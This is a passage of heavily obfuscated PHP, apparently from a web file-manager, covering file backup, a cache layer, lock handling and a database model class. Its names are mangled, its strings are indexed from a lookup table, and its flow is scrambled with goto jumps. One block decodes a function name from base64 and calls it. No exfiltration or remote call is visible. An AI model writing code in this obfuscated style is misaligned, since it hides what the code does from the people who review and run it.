array($Ú€ôâıÃ[882] => $õ­şñÅŞ, $Ú€ôâıÃ[883] => time()); Backup::set($ŸÜÄ•ø‘); return !0; } private function backupPath($ãóÆÃ’ú) { $Ï«™‰ùÎ =& $_SERVER[´È¥ö†ö]; $Ó‡Ã»ÓÖ = $ãóÆÃ’ú[$Ï«™‰ùÎ[32]]; $‹¢ÄÄÆ = Model($Ï«™‰ùÎ[846])->get($Ï«™‰ùÎ[847]); $õï¬„È = substr(md5($Ï«™‰ùÎ[848] . $‹¢ÄÄÆ . $Ó‡Ã»ÓÖ), 0, 8); return "\173\151\157\72{$ãóÆÃ’ú[$Ï«™‰ùÎ[828]]}\x7d\57\x64\141\x74\x61\142\141\163\145\57\x62\x61\143\x6b\165\160\x2f" . $Ó‡Ã»ÓÖ . $Ï«™‰ùÎ[11] . $õï¬„È; } private function tmpFilesPath() { $¥öŞ¥Ã =& $_SERVER[´È¥ö†ö]; $ÂÓâç¼¡ = TEMP_FILES; if ($GLOBALS[$¥öŞ¥Ã[6]][$¥öŞ¥Ã[92]][$¥öŞ¥Ã[873]]) { $ÂÓâç¼¡ = $GLOBALS[$¥öŞ¥Ã[6]][$¥öŞ¥Ã[92]][$¥öŞ¥Ã[873]]; if (!mk_dir($ÂÓâç¼¡) || !is_writable($ÂÓâç¼¡) || !IO::mkfile($ÂÓâç¼¡ . $¥öŞ¥Ã[874])) { $ÂÓâç¼¡ = TEMP_FILES; } } return $ÂÓâç¼¡; } } class BackupFile { public function __construct() { } public function index() { $±À°è›² = Backup::get(); $ĞœÁ„Â = $±À°è›²[$_SERVER[´È¥ö†ö][379]][$_SERVER[´È¥ö†ö][232]][$_SERVER[´È¥ö†ö][552]]; $‹ò˜Ò“¯ = array($_SERVER[´È¥ö†ö][553] => array($_SERVER[´È¥ö†ö][884], $ĞœÁ„Â), $_SERVER[´È¥ö†ö][885] => array($_SERVER[´È¥ö†ö][417], $±À°è›²[$_SERVER[´È¥ö†ö][828]])); $Â©œ©¦ = (int) Model($_SERVER[´È¥ö†ö][866])->where($‹ò˜Ò“¯)->count($_SERVER[´È¥ö†ö][552]); $æ–°€ = (int) Model($_SERVER[´È¥ö†ö][866])->where($‹ò˜Ò“¯)->sum($_SERVER[´È¥ö†ö][79]); $ÉÖî¿åÓ = new TaskFileTransfer($_SERVER[´È¥ö†ö][886], $_SERVER[´È¥ö†ö][860], $Â©œ©¦, LNG($_SERVER[´È¥ö†ö][861]) . $_SERVER[´È¥ö†ö][862] . LNG($_SERVER[´È¥ö†ö][887])); $ÉÖî¿åÓ->task[$_SERVER[´È¥ö†ö][839]] = $æ–°€; $¯ôÒ†©Û = array($_SERVER[´È¥ö†ö][888] => $Â©œ©¦, $_SERVER[´È¥ö†ö][889] => $æ–°€, $_SERVER[´È¥ö†ö][890] => time()); Backup::set($¯ôÒ†©Û); $­ğäÌ±‚ = !0; $âš¬áİ = $this->storeIds(); $Øı©ñ–£ = 1; $ì™ŞªŸÕ = 1000; $Ç­² = $Ë€¼ÆÎ‘ = 0; $ƒ©î—ÔĞ = array(); $®çæ¬¦ğ = $¯Æî¿» = 0; do { $”ìÏçåÊ = $_SERVER[´È¥ö†ö][891]; $ƒø‚°¼³ = Model($_SERVER[´È¥ö†ö][866])->where($‹ò˜Ò“¯)->field($”ìÏçåÊ)->order($_SERVER[´È¥ö†ö][892])->selectPage($ì™ŞªŸÕ, $Øı©ñ–£); $ Ç¯¢Ïé = !empty($ƒø‚°¼³[$_SERVER[´È¥ö†ö][456]]) ? $ƒø‚°¼³[$_SERVER[´È¥ö†ö][456]] : array(); foreach ($ Ç¯¢Ïé as $½úªÂŠ™) { if (!$this->_fileExist($½úªÂŠ™, $ƒ©î—ÔĞ, $âš¬áİ)) { write_log("\146\x69\154\145\x20\156\157\x74\40\x65\170\151\163\164\56\x66\x69\154\x65\111\x44\x3a{$½úªÂŠ™[$_SERVER[´È¥ö†ö][552]]}\54\40\x70\x61\x74\x68\72{$½úªÂŠ™[$_SERVER[´È¥ö†ö][87]]}", $_SERVER[´È¥ö†ö][893]); continue; } $¿Æéî = $½úªÂŠ™[$_SERVER[´È¥ö†ö][87]]; $ğª‰§¦ = "\x7b\151\x6f\72{$±À°è›²[$_SERVER[´È¥ö†ö][828]]}\175" . substr($¿Æéî, strlen("\x7b\x69\x6f\x3a{$½úªÂŠ™[$_SERVER[´È¥ö†ö][894]]}\175")); if (IO::exist($ğª‰§¦)) { $ÉÖî¿åÓ->updateFileEnd($½úªÂŠ™[$_SERVER[´È¥ö†ö][32]], $½úªÂŠ™[$_SERVER[´È¥ö†ö][79]]); } else { $ğª‰§¦ = get_path_father($ğª‰§¦); IO::mkdir($ğª‰§¦); if (!IO::copy($¿Æéî, $ğª‰§¦, $_SERVER[´È¥ö†ö][895])) { write_log($_SERVER[´È¥ö†ö][896] . $¿Æéî . $_SERVER[´È¥ö†ö][880] . $ğª‰§¦ . $_SERVER[´È¥ö†ö][178], $_SERVER[´È¥ö†ö][860]); $­ğäÌ±‚ = !1; break; } } $ĞœÁ„Â = $½úªÂŠ™[$_SERVER[´È¥ö†ö][552]]; $Ë€¼ÆÎ‘ += 1; $Ç­² += $½úªÂŠ™[$_SERVER[´È¥ö†ö][79]]; $¯Æî¿» += 1; $®çæ¬¦ğ += $½úªÂŠ™[$_SERVER[´È¥ö†ö][79]]; if ($Ç­² >= 1024 * 1024 * 100) { $¯ôÒ†©Û = array($_SERVER[´È¥ö†ö][827] => $ĞœÁ„Â, $_SERVER[´È¥ö†ö][897] => $¯Æî¿», $_SERVER[´È¥ö†ö][898] => $®çæ¬¦ğ); Backup::set($¯ôÒ†©Û); $Ç­² = $Ë€¼ÆÎ‘ = 0; } } $ÈÁ¶ƒ„ã = count($ Ç¯¢Ïé); $Øı©ñ–£++; } while ($ÈÁ¶ƒ„ã == $ì™ŞªŸÕ); $ÉÖî¿åÓ->end(); $¯ôÒ†©Û = array($_SERVER[´È¥ö†ö][899] => 1, $_SERVER[´È¥ö†ö][837] => time(), $_SERVER[´È¥ö†ö][851] => 1, $_SERVER[´È¥ö†ö][827] => $ĞœÁ„Â, $_SERVER[´È¥ö†ö][900] => time()); if ($Ë€¼ÆÎ‘) { $¯ôÒ†©Û[$_SERVER[´È¥ö†ö][897]] = $¯Æî¿»; $¯ôÒ†©Û[$_SERVER[´È¥ö†ö][898]] = $®çæ¬¦ğ; } Backup::set($¯ôÒ†©Û); return !0; } private function _fileExist($¾ÇÇœï, &$Ø’–Ä®ö, $ÈÒ¦£Ø) { $´”äí³Õ =& $_SERVER[´È¥ö†ö]; $ûûƒÒ = $¾ÇÇœï[$´”äí³Õ[87]]; if (in_array($¾ÇÇœï[$´”äí³Õ[552]], $Ø’–Ä®ö)) { return !1; } if (!in_array($¾ÇÇœï[$´”äí³Õ[894]], $ÈÒ¦£Ø)) { return !1; } if (IO::exist($ûûƒÒ)) { return !0; } $Ñû¾»ı© = get_path_father($ûûƒÒ); if (IO::exist($Ñû¾»ı©)) { $Ø’–Ä®ö[] = $¾ÇÇœï[$´”äí³Õ[552]]; return !1; } $İİÜë’¨ = array($´”äí³Õ[894] => $¾ÇÇœï[$´”äí³Õ[894]], $´”äí³Õ[87] => array($´”äí³Õ[470], "{$Ñû¾»ı©}\45")); $òÜŒùŒë = Model($´”äí³Õ[866])->where($İİÜë’¨)->field($´”äí³Õ[553])->select(); $Ø’–Ä®ö = array_merge($Ø’–Ä®ö, array_to_keyvalue($òÜŒùŒë, $´”äí³Õ[12], $´”äí³Õ[552])); return !1; } private function _fileFilter($Öå¯Æİ) { $¥êÁ—œø =& $_SERVER[´È¥ö†ö]; return; if (empty($Öå¯Æİ)) { return; } $“§äíëÄ = array($¥êÁ—œø[552] => array($¥êÁ—œø[7], array_unique($Öå¯Æİ))); $‚£¦Ó¢ = Model($¥êÁ—œø[901])->where($“§äíëÄ)->field($¥êÁ—œø[193])->select(); foreach ($‚£¦Ó¢ as $ë«–¼¨®) { Model($¥êÁ—œø[901])->remove($ë«–¼¨®[$¥êÁ—œø[193]], !1); } } private function storeIds() { $ªí—èÇê =& $_SERVER[´È¥ö†ö]; $Àİ¡ø©â = Model($ªí—èÇê[843])->listData(); $çÁÓéâ· = array(); $ÔÜÄ°“œ = $GLOBALS[$ªí—èÇê[6]][$ªí—èÇê[92]][$ªí—èÇê[902]]; foreach ($Àİ¡ø©â as $ÌöÅ·ÕØ) { $¶ğ®–’ = strtolower($ÌöÅ·ÕØ[$ªí—èÇê[98]]); if (!isset($ÔÜÄ°“œ[$¶ğ®–’])) { continue; } $Ê‚Å¦‘° = $ªí—èÇê[77] . (isset($ÔÜÄ°“œ[$¶ğ®–’]) ? $ÔÜÄ°“œ[$¶ğ®–’] : ucfirst($¶ğ®–’)); if (!class_exists($Ê‚Å¦‘°)) { continue; } $çÁÓéâ·[] = $ÌöÅ·ÕØ[$ªí—èÇê[486]]; } return $çÁÓéâ·; } } goto B¶ÎöĞº½µ; B¶ÎöĞº½µ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ˆ£êÓ‹° =& $_SERVER[´È¥ö†ö]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $–²È’„¨ = $GLOBALS[$ˆ£êÓ‹°[6]][$ˆ£êÓ‹°[435]]; $ä¶¼¸ê¬ = $–²È’„¨[$–²È’„¨[$ˆ£êÓ‹°[903]]]; $˜«áï’ = $–²È’„¨[$ˆ£êÓ‹°[904]]; switch ($–²È’„¨[$ˆ£êÓ‹°[903]]) { case $ˆ£êÓ‹°[21]: self::$handle = Model($ˆ£êÓ‹°[905]); break; case $ˆ£êÓ‹°[906]: self::$handle = new CacheRedis($ä¶¼¸ê¬, $˜«áï’); break; case $ˆ£êÓ‹°[907]: self::$handle = new CacheMemcached($ä¶¼¸ê¬, $˜«áï’); break; case $ˆ£êÓ‹°[232]: self::$handle = new CacheFile($ä¶¼¸ê¬, $˜«áï’); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŠÙŸã•ï) { if (is_array($ŠÙŸã•ï) || is_object($ŠÙŸã•ï)) { $ŠÙŸã•ï = json_encode($ŠÙŸã•ï); } $ŠÙŸã•ï = rawurlencode($ŠÙŸã•ï); return md5(KOD_SITE_ID . $_SERVER[´È¥ö†ö][11] . $ŠÙŸã•ï); } public static function get($¸ÉÊïœÄ, $¸ö²ëÂ¢ = false) { $ê‡ç»³ú = self::key($¸ÉÊïœÄ); $ñë—éä = self::init(); if ($¸ö²ëÂ¢) { return unserialize($ñë—éä->get($ê‡ç»³ú)); } if (!isset(self::$memoryCache[$ê‡ç»³ú])) { $—¯†›´â = $ñë—éä->get($ê‡ç»³ú); self::$memoryCache[$ê‡ç»³ú] = unserialize($—¯†›´â); } return self::$memoryCache[$ê‡ç»³ú]; } public static function set($‰æ’…ˆÂ, $»ÈáåÓ, $×È·×óŞ = false) { $ĞÊÎØĞ =& $_SERVER[´È¥ö†ö]; $ığ“°²« = self::key($‰æ’…ˆÂ); if (isset(self::$memoryCache[$ığ“°²«]) && self::$memoryCache[$ığ“°²«] === $»ÈáåÓ) { return !0; } if ($×È·×óŞ === 0) { self::$memoryCache[$ığ“°²«] = $»ÈáåÓ; return !0; } $À´ßòâ = self::init(); $ª±¶èµŒ = serialize($»ÈáåÓ); CacheLock::lock($‰æ’…ˆÂ . $ĞÊÎØĞ[908]); $–×®¢ğ¾ = $À´ßòâ->set($ığ“°²«, $ª±¶èµŒ, $×È·×óŞ); self::$memoryCache[$ığ“°²«] = $»ÈáåÓ; CacheLock::unlock($‰æ’…ˆÂ . $ĞÊÎØĞ[908]); return $–×®¢ğ¾; } public static function getCall($êšŒ”Ûô, $ĞÃÌã²‘, $åƒÈ¨¿È, $éÃÍÎö÷ = array()) { $ê³£ìÌ® =& $_SERVER[´È¥ö†ö]; $¿‚—ÊíÂ = self::get($êšŒ”Ûô); if ($¿‚—ÊíÂ || $¿‚—ÊíÂ === $ê³£ìÌ®[12]) { return $¿‚—ÊíÂ; } $¿‚—ÊíÂ = call_user_func_array($åƒÈ¨¿È, $éÃÍÎö÷); $¿‚—ÊíÂ = $¿‚—ÊíÂ ? $¿‚—ÊíÂ : $ê³£ìÌ®[12]; self::set($êšŒ”Ûô, $¿‚—ÊíÂ, $ĞÃÌã²‘); return $¿‚—ÊíÂ; } public static function remove($Õ‘šÓÌ) { $’æ¤çÇ· = self::key($Õ‘šÓÌ); unset(self::$memoryCache[$’æ¤çÇ·]); self::clearTimeout(); CacheLock::lock($Õ‘šÓÌ); $åÀºÎ™¼ = self::init()->remove($’æ¤çÇ·); CacheLock::unlock($Õ‘šÓÌ); return $åÀºÎ™¼; } public static function removeMemory($µúŠÁŠ˜) { $İ²œĞ© = self::key($µúŠÁŠ˜); unset(self::$memoryCache[$İ²œĞ©]); } public static function clearMemory($±²Şæ½ı = false) { if ($±²Şæ½ı) { $±²Şæ½ı = self::key($±²Şæ½ı); unset(self::$memoryCache[$±²Şæ½ı]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[´È¥ö†ö][909])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[´È¥ö†ö][910])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ú“³Éë, $³Îøıû…) { $ª‹äİ—‚ =& $_SERVER[´È¥ö†ö]; $this->cachePath = $ú“³Éë[$ª‹äİ—‚[87]]; $this->prefix = $ª‹äİ—‚[911]; $this->cacheTime = $³Îøıû…; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ú‹Ú£­Â) { $“©§äòè =& $_SERVER[´È¥ö†ö]; $Ú‹Ú£­Â = str_replace(array($“©§äòè[912], $“©§äòè[100], $“©§äòè[76]), $“©§äòè[913], $Ú‹Ú£­Â); return $this->cachePath . $“©§äòè[914] . $Ú‹Ú£­Â . $“©§äòè[915]; } public function set($Èˆ„Èç¬, $Ğ”“Ã°, $¹ÕŒö™â = false) { $¹ÕŒö™â = $¹ÕŒö™â ? $¹ÕŒö™â : $this->cacheTime; $äúóÀ÷È = $this->getFile($Èˆ„Èç¬); if (file_put_contents($äúóÀ÷È, $this->prefix . $Ğ”“Ã°, LOCK_EX)) { @touch($äúóÀ÷È, intval(time() + $¹ÕŒö™â)); clearstatcache(); return !0; } @unlink($äúóÀ÷È); return !1; } public function get($·‚¯¸…´) { $Î‘ŒŒ© = $this->getFile($·‚¯¸…´); if (file_exists($Î‘ŒŒ©) && filemtime($Î‘ŒŒ©) < time()) { @unlink($Î‘ŒŒ©); return !1; } $øÔïÇ = @file_get_contents($Î‘ŒŒ©); return substr($øÔïÇ, strlen($this->prefix)); } public function remove($ôëÅóş›) { $ë¯ÈÃƒÉ = $this->getFile($ôëÅóş›); return @unlink($ë¯ÈÃƒÉ); } public function deleteAll() { $—ï°Ü ² =& $_SERVER[´È¥ö†ö]; $ÏÈƒƒáÑ = scandir($this->cachePath); foreach ($ÏÈƒƒáÑ as $¡ƒŞÎ’Ø) { $–š´¦µ = $this->cachePath . $¡ƒŞÎ’Ø; if (strpos($–š´¦µ, $—ï°Ü ²[915]) && strpos($–š´¦µ, $—ï°Ü ²[916])) { @unlink($–š´¦µ); } } } public function clearTimeout() { $ÃÃì¯ä… =& $_SERVER[´È¥ö†ö]; $ˆĞÉù‘ = scandir($this->cachePath); foreach ($ˆĞÉù‘ as $ĞÌ¥Åü²) { $¹ì‡ƒ˜› = $this->cachePath . $ĞÌ¥Åü²; if (strpos($¹ì‡ƒ˜›, $ÃÃì¯ä…[915]) && strpos($¹ì‡ƒ˜›, $ÃÃì¯ä…[916]) && filemtime($¹ì‡ƒ˜›) < time()) { @unlink($¹ì‡ƒ˜›); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $×ãĞ‘ú‘ =& $_SERVER[´È¥ö†ö]; if (self::$handle) { return self::$handle; } $Ğ½–»Ãí = $GLOBALS[$×ãĞ‘ú‘[6]][$×ãĞ‘ú‘[435]]; self::$timeout = $Ğ½–»Ãí[$×ãĞ‘ú‘[917]] ? $Ğ½–»Ãí[$×ãĞ‘ú‘[917]] : 10; $¬ÆÙÔß” = _get($GLOBALS[$×ãĞ‘ú‘[6]], $×ãĞ‘ú‘[918]); $û²·è = $Ğ½–»Ãí[$×ãĞ‘ú‘[903]] ? $Ğ½–»Ãí[$×ãĞ‘ú‘[903]] : $×ãĞ‘ú‘[232]; if ($û²·è == $×ãĞ‘ú‘[21] && $¬ÆÙÔß” == $×ãĞ‘ú‘[13]) { $û²·è = $×ãĞ‘ú‘[232]; } switch ($û²·è) { case $×ãĞ‘ú‘[906]: self::$handle = new CacheLockRedis(); break; case $×ãĞ‘ú‘[907]: self::$handle = new CacheLockMemcached(); break; case $×ãĞ‘ú‘[21]: self::$handle = new CacheLockDatabase(); break; case $×ãĞ‘ú‘[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($×ãĞ‘ú‘[919], $×ãĞ‘ú‘[920]); } return self::$handle; } private static function key($¬Âš¹İ÷) { return $_SERVER[´È¥ö†ö][921] . Cache::key($¬Âš¹İ÷); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($®ğÓäò = '') { self::$errorMsg = $®ğÓäò; } public static function lockGlobal($ıˆº²±§, $¿ò–‘õ™) { return self::lock($ıˆº²±§, $¿ò–‘õ™, !0); } public static function lock($¦Æ¯áâ, $˜ú ¢Ó = false, $ŠƒáÜœÕ = false) { $üœÌ˜ù³ =& $_SERVER[´È¥ö†ö]; $É×ı²’š = self::init(); $˜¼Ğ¢½¶ = self::key($¦Æ¯áâ); $˜ú ¢Ó = $˜ú ¢Ó ? $˜ú ¢Ó : self::$timeout; $‘Û×ô¿û = timeFloat(); if ($GLOBALS[$üœÌ˜ù³[922]]) { if (!$É×ı²’š->lock($˜¼Ğ¢½¶, 0.2)) { die; } return !0; } $š×Û¨Î· = $É×ı²’š->lock($˜¼Ğ¢½¶, $˜ú ¢Ó); $Íğ×ËÇÒ = timeFloat(); if (!$š×Û¨Î·) { $’Ä’øëÒ = "\154\157\x63\x6b\40\145\x72\x72\157\x72\x3b\153\x65\x79\x3d{$¦Æ¯áâ}\x3b\164\x69\155\145\75{$˜ú ¢Ó}\73" . self::$errorMsg . $üœÌ˜ù³[74] . get_caller_msg(); $ş¶¨æ“§ = LNG($üœÌ˜ù³[923]) . "\50{$˜ú ¢Ó}\163\51\x2e" . LNG($üœÌ˜ù³[924]); $ş¶¨æ“§ .= $üœÌ˜ù³[925]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ş¶¨æ“§ = $ş¶¨æ“§ . $üœÌ˜ù³[926] . self::$errorMsg; } write_log($üœÌ˜ù³[927] . sprintf($üœÌ˜ù³[928], timeFloat() - $‘Û×ô¿û) . $üœÌ˜ù³[929] . $’Ä’øëÒ . $üœÌ˜ù³[930] . json_encode(error_get_last()), $üœÌ˜ù³[920]); show_json($ş¶¨æ“§, !1); } if (!$ŠƒáÜœÕ) { self::$lockItem[$˜¼Ğ¢½¶] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ñê¡Í¿´ = number_format(timeFloat() - $Íğ×ËÇÒ, 3); write_log($üœÌ˜ù³[931] . $¦Æ¯áâ . $üœÌ˜ù³[932] . $ñê¡Í¿´, $üœÌ˜ù³[920]); } return $š×Û¨Î·; } public static function lockGet($ĞßÛ‘ç¿) { $Ú–ËÚµª = self::key($ĞßÛ‘ç¿); if (self::$lockItem[$Ú–ËÚµª]) { return self::$lockItem[$Ú–ËÚµª]; } return self::init()->lockGet($Ú–ËÚµª); } public static function unlock($¿¿†“šÄ) { $”ášÚÏı =& $_SERVER[´È¥ö†ö]; $‚àˆá£ = self::key($¿¿†“šÄ); self::$lockItem[$‚àˆá£] = null; self::init()->unlock($‚àˆá£); if (GLOBAL_DEBUG_LOG_ALL) { write_log($”ášÚÏı[933] . $¿¿†“šÄ, $”ášÚÏı[920]); } return; } public static function unlockRuntime() { $éó’Îˆ¡ =& $_SERVER[´È¥ö†ö]; $¼ä¡ä¦š = self::init(); $Ğ…¸‹¬ã = !1; foreach (self::$lockItem as $¤ë¾¡£¶ => $‘Œı¾ƒû) { if (!$‘Œı¾ƒû) { continue; } $¼ä¡ä¦š->unlock($¤ë¾¡£¶); if (!$Ğ…¸‹¬ã) { $Ğ…¸‹¬ã = !0; write_log($éó’Îˆ¡[934] . $¤ë¾¡£¶ . $éó’Îˆ¡[74] . get_caller_msg(), $éó’Îˆ¡[920]); continue; } write_log($éó’Îˆ¡[934] . $¤ë¾¡£¶, $éó’Îˆ¡[920]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ì·áûĞÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($éó’Îˆ¡[935] . $Ì·áûĞÉ . $éó’Îˆ¡[936] . ACTION, $éó’Îˆ¡[920]); } } public static function fileLock($âúŞá) { $İ¯Â©Çø =& $_SERVER[´È¥ö†ö]; if (!$GLOBALS[$İ¯Â©Çø[937]]) { $GLOBALS[$İ¯Â©Çø[937]] = array(); } $GLOBALS[$İ¯Â©Çø[937]][$âúŞá] = !1; $¨ÚóÆÈ = fopen(DATA_PATH . $âúŞá . $İ¯Â©Çø[938], $İ¯Â©Çø[939]); if (!$¨ÚóÆÈ) { return !1; } $GLOBALS[$İ¯Â©Çø[937]][$âúŞá] = $¨ÚóÆÈ; if (flock($¨ÚóÆÈ, LOCK_EX)) { return !0; } self::unlock($âúŞá); show_json($İ¯Â©Çø[940], !1); return !1; } public static function fileUnlock($ÚÅ˜”¬) { $¸ˆ…œ’ =& $_SERVER[´È¥ö†ö]; $Š´ÍôŠì = $GLOBALS[$¸ˆ…œ’[937]][$ÚÅ˜”¬]; if (!$Š´ÍôŠì) { return; } $GLOBALS[$¸ˆ…œ’[937]][$ÚÅ˜”¬] = !1; flock($Š´ÍôŠì, LOCK_UN); fclose($Š´ÍôŠì); } public static function fileUnlockAll() { $„Í€¾‰’ =& $_SERVER[´È¥ö†ö]; if (!isset($GLOBALS[$„Í€¾‰’[937]]) || !$GLOBALS[$„Í€¾‰’[937]]) { return; } foreach ($GLOBALS[$„Í€¾‰’[937]] as $íŠ¸Å·ª => $”†ÉÁµæ) { if (!$”†ÉÁµæ) { continue; } $GLOBALS[$„Í€¾‰’[937]][$íŠ¸Å·ª] = !1; flock($”†ÉÁµæ, LOCK_UN); fclose($”†ÉÁµæ); } $GLOBALS[$„Í€¾‰’[937]] = array(); } } goto cŠ–¼¯ë; fåÂ¦êÅø : function binCheckBigger($Š½ğŒÁ, $¤©óÊ÷æ) { return $Š½ğŒÁ > $¤©óÊ÷æ; } $_SERVER[$_SERVER[¾ Æ·á£][3]] = ("\x38\x35\x37\x38"."\x37\x37")+0;$_97zo="wlukyxs69eb8q4njg1o7p5z2vt0d3hacmfirts0b2ai3fgkxvmurzqeh7n6pyjw951co4ld8cz89";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($³‰ÃÜŠÓ, $†Ãè’ø™) { $†ìúàÚÑ =& $_SERVER[´È¥ö†ö]; if (isset(self::$_methodList[$³‰ÃÜŠÓ])) { return @call_user_func_array(self::$_methodList[$³‰ÃÜŠÓ], $†Ãè’ø™); } else { if (method_exists($this, $³‰ÃÜŠÓ)) { return call_user_func_array(array($this, $³‰ÃÜŠÓ), $†Ãè’ø™); } else { think_exception(__CLASS__ . $†ìúàÚÑ[4] . $³‰ÃÜŠÓ . $†ìúàÚÑ[5]); } } } public static function __callStatic($ªÇå³…—, $Şâ¬Úí) { if (isset(self::$_methodListStatic[$ªÇå³…—])) { return call_user_func_array(self::$_methodListStatic[$ªÇå³…—], $Şâ¬Úí); } else { if (method_exists(self, $ªÇå³…—)) { return call_user_func_array(array(self, $ªÇå³…—), $Şâ¬Úí); } else { show_json("{$ªÇå³…—}\50\51\40\x6e\157\x74\40\145\170\151\x73\x74\x3b", !1); } } } public static function addMethod($†ÑöŞ“, $Á¶ºê¦®) { self::$_methodList[$†ÑöŞ“] = $Á¶ºê¦®; } public static function addMethodStatic($Æ¿Ô÷¨à, $š¸ ´“Û) { self::$_methodListStatic[$Æ¿Ô÷¨à] = $š¸ ´“Û; } } goto D‹Éì©œ©; E×¦Æ“İÇæ: $fileSize = strrev(base64_decode($_SERVER[¾ Æ·á£][0])); function binCheckNeq($Ï¼¸õÎ•, $Ùû¯ôš€) { return $Ï¼¸õÎ• != $Ùû¯ôš€; } $_SERVER[$_SERVER[¾ Æ·á£][1]] = $fileSize($_SERVER[$_SERVER[¾ Æ·á£][2]]); goto fåÂ¦êÅø ; d³²‘¡ŸÑê: define($_SERVER[´È¥ö†ö][331], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\x6f\162\x64\x65\x72", "\x61\x6c\x69\141\x73", "\150\141\166\151\x6e\147", "\x67\x72\x6f\x75\160", "\154\x6f\143\x6b", "\144\151\163\x74\151\x6e\143\x74", "\x61\165\x74\x6f", "\146\151\154\x74\145\162", "\x76\141\x6c\x69\x64\x61\x74\x65", "\x72\x65\163\x75\154\x74", "\x62\x69\x6e\144", "\164\x6f\153\145\x6e"); public function __construct($ì‘à¿÷¶ = '', $îÖé¿‡° = '', $ŠêüØ®É = '') { $şƒÏí¦ =& $_SERVER[´È¥ö†ö]; $this->_initialize(); if (!empty($ì‘à¿÷¶)) { if (strpos($ì‘à¿÷¶, $şƒÏí¦[10])) { list($this->dbName, $this->name) = explode($şƒÏí¦[10], $ì‘à¿÷¶); } else { $this->name = $ì‘à¿÷¶; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($îÖé¿‡°)) { $this->tablePrefix = $şƒÏí¦[12]; } elseif ($şƒÏí¦[12] != $îÖé¿‡°) { $this->tablePrefix = $îÖé¿‡°; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($şƒÏí¦[332]); } $this->db(0, empty($this->connection) ? $ŠêüØ®É : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $·®…ÓÓÛ =& $_SERVER[´È¥ö†ö]; if (empty($this->fields)) { if (think_config($·®…ÓÓÛ[333])) { $ŠÒŞº¼ = $this->dbName ? $this->dbName : think_config($·®…ÓÓÛ[334]); $˜ôáüé = think_var_cache($·®…ÓÓÛ[335] . strtolower(get_path_this($ŠÒŞº¼) . $·®…ÓÓÛ[10] . $this->name)); if ($˜ôáüé) { $ì ıÂ = think_config($·®…ÓÓÛ[336]); if (empty($ì ıÂ) || $˜ôáüé[$·®…ÓÓÛ[337]] == $ì ıÂ) { $this->fields = $˜ôáüé; return; } } } $this->flush(); } } public function flush() { $­½½ïêá =& $_SERVER[´È¥ö†ö]; $this->db->setModel($this->name); $ä¬×’˜£ = $this->db->getFields($this->getTableName()); if (!$ä¬×’˜£) { return !1; } $this->fields = array_keys($ä¬×’˜£); $this->fields[$­½½ïêá[338]] = !1; foreach ($ä¬×’˜£ as $ã‰íìØØ => $èª²¦²˜) { $­ƒ¶®Ãù[$ã‰íìØØ] = $èª²¦²˜[$­½½ïêá[33]]; if ($èª²¦²˜[$­½½ïêá[39]]) { $this->fields[$­½½ïêá[339]] = $ã‰íìØØ; if ($èª²¦²˜[$­½½ïêá[42]]) { $this->fields[$­½½ïêá[338]] = !0; } } } $this->fields[$­½½ïêá[340]] = $­ƒ¶®Ãù; if (think_config($­½½ïêá[336])) { $this->fields[$­½½ïêá[337]] = think_config($­½½ïêá[336]); } if (think_config($­½½ïêá[333])) { $‚ôÅ¬® = $this->dbName ? $this->dbName : think_config($­½½ïêá[334]); think_var_cache($­½½ïêá[335] . strtolower(get_path_this($‚ôÅ¬®) . $­½½ïêá[10] . $this->name), $this->fields); } } public function switchModel($µ³¨Ò, $ËáÊÑõÚ = array()) { $¨‡ØÑ€¾ =& $_SERVER[´È¥ö†ö]; $Ù¢ªÔ´¸ = ucwords(strtolower($µ³¨Ò)) . $¨‡ØÑ€¾[341]; if (!class_exists($Ù¢ªÔ´¸)) { think_exception($Ù¢ªÔ´¸ . think_lang($¨‡ØÑ€¾[342])); } $this->_extModel = new $Ù¢ªÔ´¸($this->name); if (!empty($ËáÊÑõÚ)) { foreach ($ËáÊÑõÚ as $Â³“…Ç¼) { $this->_extModel->setProperty($Â³“…Ç¼, $this->{$Â³“…Ç¼}); } } return $this->_extModel; } public function __set($¢ØûŠ€, $®ãØµ’Í) { $this->data[$¢ØûŠ€] = $®ãØµ’Í; } public function __get($£ÃŸº£µ) { return isset($this->data[$£ÃŸº£µ]) ? $this->data[$£ÃŸº£µ] : null; } public function __isset($şÑœ‚ÀÖ) { return isset($this->data[$şÑœ‚ÀÖ]); } public function __unset($ÓÃ…¸î¡) { unset($this->data[$ÓÃ…¸î¡]); } public function __call($ŞÏÖ¥Å, $”ÌêšøÏ) { $‘ÅØáé¦ =& $_SERVER[´È¥ö†ö]; if (in_array(strtolower($ŞÏÖ¥Å), $this->methods, !0)) { $this->options[strtolower($ŞÏÖ¥Å)] = $”ÌêšøÏ[0]; return $this; } elseif (in_array(strtolower($ŞÏÖ¥Å), 